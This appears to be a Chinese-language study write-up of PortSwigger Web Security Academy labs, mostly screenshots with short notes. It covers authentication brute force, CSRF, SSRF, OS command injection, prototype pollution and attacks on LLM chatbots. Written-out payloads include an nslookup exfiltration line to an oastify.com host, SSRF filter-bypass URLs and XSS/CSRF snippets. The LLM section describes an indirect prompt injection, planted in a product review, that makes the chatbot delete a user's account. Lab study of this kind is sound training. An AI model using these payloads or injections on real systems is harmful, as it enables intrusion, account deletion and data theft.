![image-20250716173044868](portswigger.assets/image-20250716173044868.png)

结果却发现 报错信息都一样 响应时间也没有什么区别 ![image-20250716173122509](portswigger.assets/image-20250716173122509.png)

于是我把密码长度增加， 就找到了明显时长不同的

![image-20250716173235670](portswigger.assets/image-20250716173235670.png)

再爆破密码即可



## 44.实验室：暴力破解保护失效，IP 封锁

![image-20250716174454476](portswigger.assets/image-20250716174454476.png)

这题也有ip封禁

先看看直接爆破会怎么样

![image-20250716174649042](portswigger.assets/image-20250716174649042.png)

封禁了我的ip 尝试利用XFF 发现没变化了 

再试一下用定期登录正确密码

设置为串行 然后调整pitchfork 的payload 使两次爆破都登录一次wiener即可

编写脚本构造数据集![image-20250716183316891](portswigger.assets/image-20250716183316891.png)

![image-20250716183941399](portswigger.assets/image-20250716183941399.png)



## 45.实验室：通过帐户锁定枚举用户名

![image-20250716181155528](portswigger.assets/image-20250716181155528.png)

依据账户锁定的逻辑 只要不要一直重复爆破一个账户即可

采用集束爆破

![image-20250716203755666](portswigger.assets/image-20250716203755666.png)

发现重开靶场 换一种高效的方法 既然说一直攻击一个账户会被限制 我就看看怎么限制

每个账户连续登录五次 发现只有info会被限制 那就确定了账号![image-20250716204135329](portswigger.assets/image-20250716204135329.png)



 然后单点爆破密码 看看能不能直接破 发现可以

![image-20250716204349191](portswigger.assets/image-20250716204349191.png)

只有最上面的不报错



## 46.实验室：2FA 简单绕过

![image-20250716211844245](portswigger.assets/image-20250716211844245.png)

登录就有cookie![image-20250716212306086](portswigger.assets/image-20250716212306086.png)

那就从登录跳到验证码验证的界面直接访问/my-account?id=carlos

![image-20250716213258538](portswigger.assets/image-20250716213258538.png)



## 47.实验室：2FA 逻辑不通



![image-20250716214216843](portswigger.assets/image-20250716214216843.png)

观察网站的登录过程

![image-20250716214401894](portswigger.assets/image-20250716214401894.png)

填好账号密码看到了cookie

![image-20250716214436771](portswigger.assets/image-20250716214436771.png)

这应该就是验证码的包

![image-20250716230501867](portswigger.assets/image-20250716230501867.png)![image-20250716230519812](portswigger.assets/image-20250716230519812.png)





![image-20250716214536820](portswigger.assets/image-20250716214536820.png)

抓到发验证码的包，修改账户名称 爆破四位验证码

爆破了1w年 终于找到了（其中因为忘记发送验证码就一直爆破所以找不到）![image-20250716231845695](portswigger.assets/image-20250716231845695.png)



## 48.实验：暴力破解保持登录状态的 cookie

![image-20250716232120027](portswigger.assets/image-20250716232120027.png)

![image-20250716232418282](portswigger.assets/image-20250716232418282.png)

猜测是密码的hash加密

![image-20250716232637384](portswigger.assets/image-20250716232637384.png)

验证成功 

写个脚本 或者直接设置操作

![image-20250717000931150](portswigger.assets/image-20250717000931150.png)

爆破找到![image-20250717000957503](portswigger.assets/image-20250717000957503.png)



## 49.实验室：离线密码破解

![image-20250717001325339](portswigger.assets/image-20250717001325339.png)

本题是通过xss获取carlos的cookie

发布评论![image-20250717002947610](portswigger.assets/image-20250717002947610.png)

窃取到信息![image-20250717003008057](portswigger.assets/image-20250717003008057.png)

解密

![image-20250717003018659](portswigger.assets/image-20250717003018659.png)

![image-20250717003026425](portswigger.assets/image-20250717003026425.png)





## 50.实验室：密码重置逻辑不通

![image-20250717020903356](portswigger.assets/image-20250717020903356.png)

操作一遍改密码 

![image-20250717021754473](portswigger.assets/image-20250717021754473.png)

在这里有token 那就只需要把用户名改成要攻击的carlos再放包即可

帮助carlos改了密码 在登录



## 51.实验室：通过中间件进行密码重置中毒

![image-20250717023145532](portswigger.assets/image-20250717023145532.png)

链接投毒

登录以后看到自己的邮箱![image-20250717023507406](portswigger.assets/image-20250717023507406.png)

![image-20250717024157331](portswigger.assets/image-20250717024157331.png)

看host的网址和我接受链接里的一样 猜测是后端拼接

![image-20250717024246659](portswigger.assets/image-20250717024246659.png)

这是发送的链接 想办法变成我的网站链接

![image-20250717023825935](portswigger.assets/image-20250717023825935.png)

改host一直行不通 加上xfh

![image-20250717025222865](portswigger.assets/image-20250717025222865.png)

查看我的网站

![image-20250717025239762](portswigger.assets/image-20250717025239762.png)

拿到token了 构造回原来的链接

![image-20250717025349115](portswigger.assets/image-20250717025349115.png)

成功拿到carlos改密码的链接 帮他改密码



## 52.实验室：通过更改密码进行密码暴力破解

![image-20250717111605031](portswigger.assets/image-20250717111605031.png)

先想直接发包![image-20250717112551364](portswigger.assets/image-20250717112551364.png)

但结果都是302不可取

再看看改密码的其他情况

如果再改密码的地方输错原始密码但输对两次新密码会弹回登录页面 

如果输错两次新密码 会出现两种报错，

![image-20250717113242424](portswigger.assets/image-20250717113242424.png)![image-20250717113537026](portswigger.assets/image-20250717113537026.png)

根据这特性爆破找到密码

![image-20250717113625012](portswigger.assets/image-20250717113625012.png)

![image-20250717113718620](portswigger.assets/image-20250717113718620.png)

再发包 发现更改密码成功



## 53.实验室：暴力破解保护失效，每个请求需要多个凭证

![image-20250717115751041](portswigger.assets/image-20250717115751041.png)

抓包看到密码输入格式

![image-20250717115914216](portswigger.assets/image-20250717115914216.png)

xff无法绕过![image-20250717120107799](portswigger.assets/image-20250717120107799.png)

把字符串换成列表数组![image-20250717120432193](portswigger.assets/image-20250717120432193.png)

成功登录

## 54.实验室：使用暴力攻击绕过 2FA

![image-20250717120634048](portswigger.assets/image-20250717120634048.png)

登录后需要验证码![image-20250717120735461](portswigger.assets/image-20250717120735461.png)

直接爆破的话会过不了cfrf验证，因为错了两次就会注销验证![image-20250717121319011](portswigger.assets/image-20250717121319011.png)



![image-20250717123600176](portswigger.assets/image-20250717123600176.png)

测试宏可执行后，现在，在 Burp Intruder 发送每个请求之前，宏都会自动以 Carlos 的身份重新登录。

![image-20250718024423686](portswigger.assets/image-20250718024423686.png)



# 7.**API 测试**



## 55.实验室：利用文档利用 API 端点

![image-20250717193651281](portswigger.assets/image-20250717193651281.png)

很多地方都能找到路径![image-20250717194150807](portswigger.assets/image-20250717194150807.png)



![image-20250717194857522](portswigger.assets/image-20250717194857522.png)

一步一步退 到api有302跳转了![image-20250717195235424](portswigger.assets/image-20250717195235424.png)

![image-20250717195255623](portswigger.assets/image-20250717195255623.png)

然后按文档构造即可![image-20250717195352211](portswigger.assets/image-20250717195352211.png)



## 56.实验：查找并利用未使用的 API 端点

![image-20250717211512900](portswigger.assets/image-20250717211512900.png)

![image-20250717213004703](portswigger.assets/image-20250717213004703.png)

只有PATCH有回显

![image-20250717213015942](portswigger.assets/image-20250717213015942.png)

按要求加上type![image-20250717213240380](portswigger.assets/image-20250717213240380.png)

再给一个值看看![image-20250717213327391](portswigger.assets/image-20250717213327391.png)

按要求给price赋值 发包再看网页 发现价格变了![image-20250717213431220](portswigger.assets/image-20250717213431220.png)

把价格改成0 直接购买

## 57.实验室：利用大规模分配漏洞

![image-20250717215151785](portswigger.assets/image-20250717215151785.png)

购买界面 抓付账的包![image-20250717221231489](portswigger.assets/image-20250717221231489.png)

切换到GET![image-20250717221458541](portswigger.assets/image-20250717221458541.png)

把上面那个参数改为1放入post发包看看![image-20250717221818570](portswigger.assets/image-20250717221818570.png)

去那个页面看可以知道 是购买失败，参数应该是折扣 改为100 购买成功![image-20250717221921017](portswigger.assets/image-20250717221921017.png)

![image-20250717222008252](portswigger.assets/image-20250717222008252.png)



## 58.实验室：利用查询字符串中的服务器端参数污染

![image-20250717225628311](portswigger.assets/image-20250717225628311.png)

参数不受支持

![image-20250717230954140](portswigger.assets/image-20250717230954140.png)

未指定字段

![image-20250717231059353](portswigger.assets/image-20250717231059353.png)

![image-20250717231742217](portswigger.assets/image-20250717231742217.png)

翻出一个源码![image-20250717232312642](portswigger.assets/image-20250717232312642.png)



![image-20250717231811809](portswigger.assets/image-20250717231811809.png)

构造payload更改密码



## 59.实验：利用 REST URL 中的服务器端参数污染

![image-20250717233955537](portswigger.assets/image-20250717233955537.png)

![image-20250717235114607](portswigger.assets/image-20250717235114607.png)

被转义了

![image-20250717235140230](portswigger.assets/image-20250717235140230.png)

提示 路由无效，请参考API定义 那就找找api文档

![image-20250718000439677](portswigger.assets/image-20250718000439677.png)

![image-20250718000325386](portswigger.assets/image-20250718000325386.png)

![image-20250718000722095](portswigger.assets/image-20250718000722095.png)

一层一层构造 

![image-20250718001518680](portswigger.assets/image-20250718001518680.png)

![image-20250718001833255](portswigger.assets/image-20250718001833255.png)

出于安全原因，此版本的 API 仅支持电子邮件字段

一步一步退 到v1就有权限了![image-20250718002037152](portswigger.assets/image-20250718002037152.png)





# 8.**Web LLM 攻击** 



## 60.实验室：利用过度代理的 LLM API

![image-20250719213555399](portswigger.assets/image-20250719213555399.png)

![image-20250719214500351](portswigger.assets/image-20250719214500351.png)

![image-20250719214508029](portswigger.assets/image-20250719214508029.png)



## 61.实验室：利用 LLM API 中的漏洞

![image-20250719215249927](portswigger.assets/image-20250719215249927.png)

询问调用了哪些接口

![image-20250719215728696](portswigger.assets/image-20250719215728696.png)

​	看看第二个函数用什么参数![image-20250719220125465](portswigger.assets/image-20250719220125465.png)

用我的邮件订阅看看

![image-20250719220253836](portswigger.assets/image-20250719220253836.png)

接收到信息

![image-20250719220411609](portswigger.assets/image-20250719220411609.png)

![image-20250719220809435](portswigger.assets/image-20250719220809435.png)

看看能不能执行 命令 ![image-20250719220821993](portswigger.assets/image-20250719220821993.png)

直接删除![image-20250719221353931](portswigger.assets/image-20250719221353931.png)

无回显 但看结果是成功了



## 62.实验室：间接快速注入

![image-20250720200959556](portswigger.assets/image-20250720200959556.png)

先看看能执行哪些api

![image-20250720201357958](portswigger.assets/image-20250720201357958.png)

先注册一个用户

![image-20250720202237336](portswigger.assets/image-20250720202237336.png)

![image-20250720202306248](portswigger.assets/image-20250720202306248.png)

把所有接口都试一遍，试试间接注入 给商品写评价 ，再看看访问接口

![image-20250720203301079](portswigger.assets/image-20250720203301079.png)

![image-20250720203217182](portswigger.assets/image-20250720203217182.png)

![image-20250720212016882](portswigger.assets/image-20250720212016882.png)



![image-20250720212447371](portswigger.assets/image-20250720212447371.png)

再访问（括号是仿照LLM的json格式增加的）

![image-20250720212513466](portswigger.assets/image-20250720212513466.png)

成功删除， 等carlos访问这个api 账户就会被删除



## 63.实验室：利用 LLM 中不安全的输出处理

![image-20250720224531870](portswigger.assets/image-20250720224531870.png)

看题目 先注入XSS试试<img src=1 onerror=alert(1)>

![image-20250720224942053](portswigger.assets/image-20250720224942053.png)

看看有哪些能使用的api

![image-20250720225256599](portswigger.assets/image-20250720225256599.png)

测试一下![image-20250720225430972](portswigger.assets/image-20250720225430972.png)

返回  包含无效内容

![image-20250720225711788](portswigger.assets/image-20250720225711788.png)

注入删除的xss

![image-20250720230418433](portswigger.assets/image-20250720230418433.png)

![image-20250720230901865](portswigger.assets/image-20250720230901865.png)

能成功执行，按理说是会被过滤

但其实要隐藏信息，

![image-20250720231145634](portswigger.assets/image-20250720231145634.png)



# 9.**跨站请求伪造 (CSRF)** 



## 64.实验室：无防御的 CSRF 漏洞

![image-20250720235946019](portswigger.assets/image-20250720235946019.png)

抓出修改邮件的包

![image-20250721000747072](portswigger.assets/image-20250721000747072.png)



## 65.实验室：CSRF，其中令牌验证取决于请求方法

![image-20250721002418788](portswigger.assets/image-20250721002418788.png)

这是POST请求的表单页面

![image-20250721002600250](portswigger.assets/image-20250721002600250.png)

将请求方式换成GET 再去掉CSRF token看看行不行

![image-20250721002720306](portswigger.assets/image-20250721002720306.png)

更改成功，那就直接用GET请求的表单生成poc即可



## 66.实验室：CSRF，其中令牌验证取决于令牌是否存在

![image-20250721003034200](portswigger.assets/image-20250721003034200.png)

有些token验证正确与否（存在的话） 那直接删除参数可能能绕过

![image-20250721003256234](portswigger.assets/image-20250721003256234.png)

直接删掉测试能成功，那就提交poc



## 67.实验室：令牌与用户会话不绑定的 CSRF

![image-20250721003459379](portswigger.assets/image-20250721003459379.png)

某些应用程序不会验证令牌是否与发出请求的用户属于同一会话。相反，应用程序会维护一个全局令牌池，其中包含已颁发的令牌，并接受池中出现的任何令牌。

在这种情况下，攻击者可以使用自己的帐户登录应用程序，获取有效的令牌，然后在 CSRF 攻击中将该令牌提供给受害者用户。

测试：

 假设wiener是受害者，攻击者carlos用自己的tokens使得wiener的验证通过

![image-20250721004238234](portswigger.assets/image-20250721004238234.png)

登出carlos 用wiener验证

![image-20250721004417126](portswigger.assets/image-20250721004417126.png)

成功更改

那就用自己的token提交poc



## 68.实验：将令牌与非会话 cookie 绑定的 CSRF

![image-20250721030842524](portswigger.assets/image-20250721030842524.png)



![image-20250721031505213](portswigger.assets/image-20250721031505213.png)

![image-20250721031819102](portswigger.assets/image-20250721031819102.png)

先后发送这两个 ，发现能修改成功![image-20250721031847320](portswigger.assets/image-20250721031847320.png)

其实就是token是和key绑定

现在要做的就是利用 search 接口注入 csrfKey cookie 到受害者浏览器

![image-20250721033639349](portswigger.assets/image-20250721033639349.png)

![image-20250721035041772](portswigger.assets/image-20250721035041772.png)

GET /?search=test
Set-Cookie: csrfKey=abc123; SameSite=None这是关键 保证实现跨子域共享cookie



## 69.实验：CSRF，其中 cookie 中存在重复的 token

![image-20250721155117776](portswigger.assets/image-20250721155117776.png)

先看看token具体实现方式

![image-20250721155400993](portswigger.assets/image-20250721155400993.png)

采用核对token

![image-20250721155954603](portswigger.assets/image-20250721155954603.png)

利用search没有核对保护 但生产cookie

![image-20250721161329710](portswigger.assets/image-20250721161329710.png)



## 70.实验室：通过方法覆盖绕过 SameSite Lax

![image-20250721164314853](portswigger.assets/image-20250721164314853.png)

按题目修改方法![image-20250721164907850](portswigger.assets/image-20250721164907850.png)

提示只能用POST

加参数覆盖请求方式 发现成功![image-20250721165103080](portswigger.assets/image-20250721165103080.png)

生成poc![image-20250721165855425](portswigger.assets/image-20250721165855425.png)

（自动跳转的话不是顶级导航）

1. 在**Body**部分，创建一个 HTML/JavaScript 负载，诱使查看者的浏览器发出恶意`GET`请求。请记住，这必须引发顶级导航才能包含会话 Cookie。以下是一种可能的方法：

   ```
   <script>
       document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
   </script>
   ```



## 71.实验室：通过客户端重定向绕过 SameSite Strict

### on-site gadget

## 🕷️ 攻击流程（CSRF 绕过 SameSite）：

1. 受害者访问了攻击者控制的网站（evil.com）。
2. 攻击者用 iframe 加载 `https://victim.com/redirect.html?next=/account/delete`
3. 这个页面运行 JS 后跳转到了 `/account/delete`
4. 浏览器以为是自己网站内跳转，于是带上了 Cookie！
5. 如果 `/account/delete` 是危险操作，比如不小心把用户删号了，那就出事了！

![image-20250721171714111](portswigger.assets/image-20250721171714111.png)

这个漏洞原理实际上就是

srict的情况下 但网页有一个代码漏洞导致了客户端重定向

打开靶场 用repeater发包修改邮箱![image-20250721185216646](portswigger.assets/image-20250721185216646.png)

cookie限制了strict![image-20250721185459737](portswigger.assets/image-20250721185459737.png)

找不到可用的源码，最后在发布过品论后 看到有用源码![image-20250721190057001](portswigger.assets/image-20250721190057001.png)

这里提供了跳转

如果我的postid是1/../../my-account，拼接后就会返回account界面

![image-20250721192635319](portswigger.assets/image-20250721192635319.png)

自己测试成功跳转 但是修改不了 改一下请求方式 

再后面拼接上修改的api，再测试 能成功修改（&要换成编码格式%26）![image-20250721193015948](portswigger.assets/image-20250721193015948.png)





## 72.实验室：通过同级域绕过 SameSite Strict

![image-20250721194646490](portswigger.assets/image-20250721194646490.png)

先连接用户的websocket窃听记录![image-20250721195613417](portswigger.assets/image-20250721195613417.png)

因为strick所以没传递cookie 只有连接的消息

### **`Access-Control-Allow-Origin` 是什么？**

`Access-Control-Allow-Origin`（简称 **ACAO**）是 **HTTP 响应头** 的一部分，用于 **控制跨域资源共享（CORS, Cross-Origin Resource Sharing）**。它决定哪些外部网站（域）可以访问当前服务器的资源

![image-20250721202015819](portswigger.assets/image-20250721202015819.png)

登录这个网站![image-20250721202127280](portswigger.assets/image-20250721202127280.png)

尝试XSS注入

![image-20250721202223009](portswigger.assets/image-20250721202223009.png)

成功反射，请求方式换为GET依旧可行

![image-20250721202430604](portswigger.assets/image-20250721202430604.png)

cms有xss漏洞 那就在xss可注入处注入csrf poc

![image-20250721203027505](portswigger.assets/image-20250721203027505.png)

轮询后拿到密码

![image-20250721203054199](portswigger.assets/image-20250721203054199.png)



## 73.实验室：通过 cookie 刷新绕过 SameSite Lax

### 关键漏洞：新 Cookie 的 120 秒豁免期

Chrome 为了兼容 **单点登录（SSO）** 等场景，对 **新颁发的 Cookie** 有一个特殊规则：

- **如果 Cookie 未明确设置 `SameSite=Lax`（即浏览器默认行为）**，则在 **前 120 秒内**，即使是非安全方法（如 `POST`）的 **顶级请求**，浏览器也会发送该 Cookie。
- **120 秒后**，SameSite Lax 限制生效，跨站 `POST` 不再携带 Cookie。

**注意**：

- 此规则 **不适用于** 显式设置 `SameSite=Lax` 的 Cookie（仅适用于浏览器默认行为）。
- **仅适用于顶级导航（Top-Level Navigation）**，iframe 或 fetch/XHR 仍受限制。

### **攻击条件**

1. 目标网站 **未显式设置 `SameSite=Lax`**（依赖浏览器默认行为）。
2. 攻击者能 **诱导用户获取一个新会话 Cookie**（例如通过 OAuth 登录、强制重新认证）。
3. 在 **120 秒内** 发起跨站 `POST` 请求（如 CSRF 攻击）。

![image-20250721204639492](portswigger.assets/image-20250721204639492.png)

完整登录一遍 发现了author登录机制，访问/social-login，会重新自动登录

![image-20250721210118098](portswigger.assets/image-20250721210118098.png)

用window.open使`/social-login`在新窗口中打开以避免在发送更改电子邮件请求之前离开漏洞。但window.open会被拦截

![image-20250721210106338](portswigger.assets/image-20250721210106338.png)

加上onclick，等用户自己点击就算主动操作



## 74.实验室：CSRF，其中 Referer 验证取决于是否存在标头

![image-20250721211701030](portswigger.assets/image-20250721211701030.png)

尝试再改邮箱的标头里改一下referer

![image-20250721211851104](portswigger.assets/image-20250721211851104.png)

如果直接删除referer![image-20250721212105853](portswigger.assets/image-20250721212105853.png)

重定向了 说明能更改

<head>
<meta name="Referrer" content="never">
</head>

| `content` 值        | 行为描述                                                     |
| :------------------ | :----------------------------------------------------------- |
| **`no-referrer`**   | 等同于 `never`，完全不发送 `Referer`（最严格）。             |
| **`origin`**        | 仅发送当前页面的**域名**（如 `https://example.com`），不包含完整路径。 |
| **`same-origin`**   | 同域请求发送完整 `Referer`，跨域请求不发送。                 |
| **`strict-origin`** | 同域或降级（HTTPS→HTTP）时发送域名，跨域且安全时不发送。     |
| **`unsafe-url`**    | 始终发送完整 `Referer`（即使从 HTTPS 跳转到 HTTP，可能泄露数据）。 |

![image-20250721212713705](portswigger.assets/image-20250721212713705.png)



## 75.实验室：Referer 验证失败的 CSRF

这次是去绕过后端简单的refer匹配

![image-20250721213725280](portswigger.assets/image-20250721213725280.png)

![image-20250721214654375](portswigger.assets/image-20250721214654375.png)

通过测试 前后加字符都没事 那就是白名单验证“0a7900500498344380f690e9009e005b.web-security-academy.net”

![image-20250721215328539](portswigger.assets/image-20250721215328539.png)

注意两个地方

1.Referrer-Policy: unsafe-url

`Referrer-Policy` 是用来控制浏览器在发起请求时是否、以及如何包含 `Referer` 头的。

- `unsafe-url` 是一种最宽松的策略，它会让浏览器**始终发送完整的 URL（包括域名 + 路径 + 查询参数）**作为 `Referer`。

2.利用 history API 修改地址栏：

history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")

浏览器地址栏变成 `/钓鱼路径/?目标域名`

https://exploit-server.net/?YOUR-LAB-ID.web-security-academy.net





# 10**服务器端请求伪造 (SSRF) 攻击**



## 76.实验：针对本地服务器的基本 SSRF

![image-20250722171748347](portswigger.assets/image-20250722171748347.png)

查看库存抓包

![image-20250722172010134](portswigger.assets/image-20250722172010134.png)

![image-20250722172151416](portswigger.assets/image-20250722172151416.png)

直接删除删不了？![image-20250722172348910](portswigger.assets/image-20250722172348910.png)

![image-20250722173538553](portswigger.assets/image-20250722173538553.png)

用 服务器提权删除

![image-20250722173622054](portswigger.assets/image-20250722173622054.png)



## 77.实验：针对另一个后端系统的基本 SSRF

攻击内网![image-20250722173820811](portswigger.assets/image-20250722173820811.png)



扫描内网![image-20250722174356219](portswigger.assets/image-20250722174356219.png)

再ssrf用服务器发起删除用户的请求

![image-20250722174447597](portswigger.assets/image-20250722174447597.png)



## 78.实验：基于黑名单的输入过滤器的 SSRF

![image-20250722175252362](portswigger.assets/image-20250722175252362.png)

直接发送返回

![image-20250722175735324](portswigger.assets/image-20250722175735324.png)

![image-20250722180634142](portswigger.assets/image-20250722180634142.png)

![image-20250722180836127](portswigger.assets/image-20250722180836127.png)

双重url编码 就是再 一次编码基础上加一个%25

如果是白名单

- 您可以使用 字符将凭据嵌入到 URL 中的主机名之前`@`。例如：

  ```
  https://expected-host:fakepassword@evil-host
  ```

- 您可以使用`#`字符来指示 URL 片段。例如：

  ```
  https://evil-host#expected-host
  ```

- 您可以利用 DNS 命名层次结构，将所需的输入放入您控制的完全限定 DNS 名称中。例如：

  ```
  https://expected-host.evil-host
  ```

- 您可以对字符进行 URL 编码，以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式与执行后端 HTTP 请求的代码不同，则此功能尤其有用。您也可以尝试对字符进行双重编码；某些服务器会递归地对收到的输入进行 URL 解码，这可能会导致进一步的差异。

## 79.实验室：通过开放重定向漏洞绕过过滤器的 SSRF

![image-20250722182320227](portswigger.assets/image-20250722182320227.png)

先走一遍功能

看到有一个NEXT product功能 ![image-20250722182657002](portswigger.assets/image-20250722182657002.png)

发包，发现有重定向![image-20250722182726547](portswigger.assets/image-20250722182726547.png)

刚好查询库存功能也是这个格式![image-20250722182806635](portswigger.assets/image-20250722182806635.png)

看看post能不能传参get的值

![image-20250722183616537](portswigger.assets/image-20250722183616537.png)

测试成功，直接攻击

![image-20250722183638406](portswigger.assets/image-20250722183638406.png)



## 80.实验室：带外检测的盲 SSRF

![image-20250722185218709](portswigger.assets/image-20250722185218709.png)

按题目要求膝盖reffer

![image-20250722185534199](portswigger.assets/image-20250722185534199.png)

看到有连接![image-20250722185544246](portswigger.assets/image-20250722185544246.png)

就直接结束了



## 81.实验室：利用 Shellshock 进行盲 SSRF 攻击

![image-20250722190556065](portswigger.assets/image-20250722190556065.png)

修改reffer 插入payload![image-20250722190858251](portswigger.assets/image-20250722190858251.png)

看到能连接

这里用到shellshock

### **Shellshock**

 是一个严重的远程代码执行漏洞，存在于 GNU Bash（Bourne Again SHell）中。它最早于 **2014 年** 被披露，编号为 **CVE-2014-6271**。

![image-20250722201151547](portswigger.assets/image-20250722201151547.png)

`/usr/bin/nslookup` 是 Linux/Unix 系统中的一个命令行工具，用于进行 **DNS 查询**，即将域名解析为 IP 地址，或反过来查询 IP 地址对应的域名。

![image-20250722200210004](portswigger.assets/image-20250722200210004.png)

扫描服务器

![image-20250722201943490](portswigger.assets/image-20250722201943490.png)



## 82.实验室：基于白名单的输入过滤器的 SSRF

![image-20250722204711306](portswigger.assets/image-20250722204711306.png)

![image-20250722205254806](portswigger.assets/image-20250722205254806.png)

看错误提示

经过测试只有http://localhost@stock.weliketoshop.net/情况下

白名单要再@后面，先让 服务器验证通过 再把他拼比掉 这样就要用到双重url

http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos

接受的时候解码一次 发送请求又解码一次





# 11.访问控制	

## 83.实验室：不受保护的管理功能和不可预测的 URL

![image-20250722231039607](portswigger.assets/image-20250722231039607.png)

源码中找到![image-20250722231119032](portswigger.assets/image-20250722231119032.png)



## 84.实验室：由请求参数控制的用户角色

![image-20250722231321541](portswigger.assets/image-20250722231321541.png)

![image-20250722231410126](portswigger.assets/image-20250722231410126.png)

改成true获得权限



## 85.实验室：用户 ID 由请求参数控制，用户 ID 不可预测

![image-20250722232129197](portswigger.assets/image-20250722232129197.png)

找到carlos的文章![image-20250722233224016](portswigger.assets/image-20250722233224016.png)

点链接看到id![image-20250722233242310](portswigger.assets/image-20250722233242310.png)

直接用这个登录



## 86.实验：请求参数控制用户 ID 并泄露密码

![image-20250722233550556](portswigger.assets/image-20250722233550556.png)

登录后直接再登录界面改carlos 发现能拿到密码

![image-20250722233828200](portswigger.assets/image-20250722233828200.png)

## 87.实验室：可以在用户配置文件中修改用户角色

![image-20250722234503873](portswigger.assets/image-20250722234503873.png)

发邮件界面找到能注入的点![image-20250722235322064](portswigger.assets/image-20250722235322064.png)

再送包的地方（修改邮箱）修改我的roleid



## 88.实验室：基于 URL 的访问控制可以被规避

![image-20250723000304558](portswigger.assets/image-20250723000304558.png)



直接加载管理员不行![image-20250723000710191](portswigger.assets/image-20250723000710191.png)

响应内容非常简洁，这表明它可能来自前端系统。

用标头去访问

X-Original-Url:/admin



![image-20250723001253213](portswigger.assets/image-20250723001253213.png)

![image-20250723001508191](portswigger.assets/image-20250723001508191.png)

![image-20250723001837120](portswigger.assets/image-20250723001837120.png)

## 89.实验室：基于方法的访问控制可以被规避

![image-20250723001946128](portswigger.assets/image-20250723001946128.png)

![image-20250723004217458](portswigger.assets/image-20250723004217458.png)

修改请求方式为GEt绕过对POST的限制

## 90.实验室：通过请求参数控制用户 ID，重定向时发生数据泄露

![image-20250723004536372](portswigger.assets/image-20250723004536372.png)

把参数id的值改成carlos 重定向时泄露信息 ![image-20250723005101839](portswigger.assets/image-20250723005101839.png)

## 91.实验室：不安全的直接对象引用

![image-20250723005707311](portswigger.assets/image-20250723005707311.png)

下载聊天记录 看到居然有序号![image-20250723005842461](portswigger.assets/image-20250723005842461.png)

![image-20250723010028990](portswigger.assets/image-20250723010028990.png)



## 92.实验室：多步骤流程，但某一步骤没有访问控制

![image-20250723010221832](portswigger.assets/image-20250723010221832.png)

- 开发者以为“前面已经校验过了，后面就没必要再重复验证”
- 假设用户会**按顺序执行操作**，不会跳过任何步骤
- 权限校验代码分散在不同地方，难以统一管理

再最后验证哪部提权

![image-20250723011342255](portswigger.assets/image-20250723011342255.png)



## 93.实验室：基于 Referer 的访问控制

![image-20250723011442369](portswigger.assets/image-20250723011442369.png)



# 12.操作系统命令注入

 

## 94.实验室：OS 命令注入，简单案例

![image-20250723204212842](portswigger.assets/image-20250723204212842.png)

![image-20250723204725861](portswigger.assets/image-20250723204725861.png)



## 95.实验室：具有时间延迟的盲操作系统命令注入

![image-20250723205828163](portswigger.assets/image-20250723205828163.png)



![image-20250723211226225](portswigger.assets/image-20250723211226225.png)

延迟有这几种方式

| 命令                   | 含义                      |
| ---------------------- | ------------------------- |
| `ping -c 10 127.0.0.1` | ping 本机 10 次，约 10 秒 |
| `sleep 10`             | 直接让进程睡眠 10 秒      |
| `timeout 10`           | 类似 sleep                |

;sleep# #注释掉后面



## 96.实验室：使用输出重定向进行盲操作系统命令注入

![image-20250723212010499](portswigger.assets/image-20250723212010499.png)

![image-20250723212929109](portswigger.assets/image-20250723212929109.png)

写入文件1.txt 再打开网站中其他图片看到检索的网址是https://0a5b004c03c4c23f85e7d58e0097008c.web-security-academy.net/image?filename=7.jpg

查看/image?filename=1.txt

![image-20250723213022259](portswigger.assets/image-20250723213022259.png)



## 97.实验室：通过带外交互进行盲操作系统命令注入

![image-20250723213200240](portswigger.assets/image-20250723213200240.png)

​	![image-20250723215643472](portswigger.assets/image-20250723215643472.png)

![image-20250723215647974](portswigger.assets/image-20250723215647974.png)



## 98.实验室：盲操作系统命令注入与带外数据泄露

97已经预判了

aaa%40qq.cn;/usr/bin/nslookup `whoami`.4pu740ogzcylrqbehfmdnlflqcw4ku8j.oastify.com #

# 13**原型污染** 

![image-20250724004408844](portswigger.assets/image-20250724004408844.png)

`username`对象可以访问 和 的属性和`String.prototype`方法`Object.prototype`。，因此这条链最终会回到顶层的`Object.prototype`，其原型就是`null`。

成功利用原型污染需要以下关键要素：

- 原型污染源——这是任何使您能够用任意属性毒害原型对象的输入。

- 接收器 - 换句话说，就是能够执行任意代码的 JavaScript 函数或 DOM 元素。

- 可利用的小工具 - 这是任何未经适当过滤或清理就传递到接收器的属性。

  ```
  __proto__.[]=  constructor[prototype][polluted]=yes
  ```

  

## 99`.实验室：通过客户端原型污染进行 DOM XSS

![image-20250724190809337](portswigger.assets/image-20250724190809337.png)



### 手动：

注入payload

![image-20250724191710345](portswigger.assets/image-20250724191710345.png)

?__proto__[transport_url]=bar

![image-20250724195028601](portswigger.assets/image-20250724195028601.png)



控制台查看原型

![image-20250724191656052](portswigger.assets/image-20250724191656052.png)

说明污染源有了

查看源代码：![image-20250724191822710](portswigger.assets/image-20250724191822710.png)

疑似有gadget

![image-20250724194153868](portswigger.assets/image-20250724194153868.png)

插件：

![image-20250724194601420](portswigger.assets/image-20250724194601420.png)



## 100.实验室：通过替代原型污染向量进行 DOM XSS

![image-20250724195147504](portswigger.assets/image-20250724195147504.png)

?__proto__.foo=bar

![image-20250724200758818](portswigger.assets/image-20250724200758818.png)

![image-20250724201105584](portswigger.assets/image-20250724201105584.png)

直接alert(1);执行不出来 ，在控制台找到错误地点，打断点![image-20250724202024346](portswigger.assets/image-20250724202024346.png)

看到后面还有个1，构造alert（1）-

或则变成?__proto__.sequence=alert(1)%2b![image-20250724202828801](portswigger.assets/image-20250724202828801.png)



## 101.实验室：通过有缺陷的清理方法造成客户端原型污染

![image-20250724205154461](portswigger.assets/image-20250724205154461.png)

首先用了proto和constructor都没反应 ，看看源代码

![image-20250724211114987](portswigger.assets/image-20250724211114987.png)

这里好像用了过滤

白这些字符换成空

用双写绕过?__pro__proto__to__[foo]=bar![image-20250724211415052](portswigger.assets/image-20250724211415052.png)

![image-20250724211921465](portswigger.assets/image-20250724211921465.png)

看到这个开始构造![image-20250724212056058](portswigger.assets/image-20250724212056058.png)

![image-20250724211951499](portswigger.assets/image-20250724211951499.png)



## 102.实验室：第三方库中的客户端原型污染

![image-20250724221751068](portswigger.assets/image-20250724221751068.png)

![image-20250724222625770](portswigger.assets/image-20250724222625770.png)

